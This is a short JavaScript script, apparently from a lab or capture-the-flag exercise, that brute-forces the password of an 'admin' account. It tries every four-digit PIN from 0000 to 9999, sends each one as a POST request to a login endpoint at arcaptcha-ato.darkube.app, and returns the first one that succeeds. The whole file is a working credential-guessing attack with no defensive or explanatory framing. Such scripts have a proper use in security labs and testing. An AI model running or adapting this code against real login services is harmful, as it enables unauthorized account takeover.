async function crackPassword(username) {
    for (i = 0; i < 10000; i++) {
        console.log(`Attempt #${i}`);
        var password = i.toString().padStart(4, "0");
        if (await checkCredentials(username, password)) {
            return password;
        }
    }
    return "NOT FOUND";
}

async function checkCredentials(username, password) {
    let resp = await fetch("https://arcaptcha-ato.darkube.app/", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: `username=${username}&password=${password}`,
    });
    let json = await resp.json();
    if (json["status"] == "OK") return true;
    return false;
}

async function run() {
    console.log(await crackPassword("admin"));
}

run();
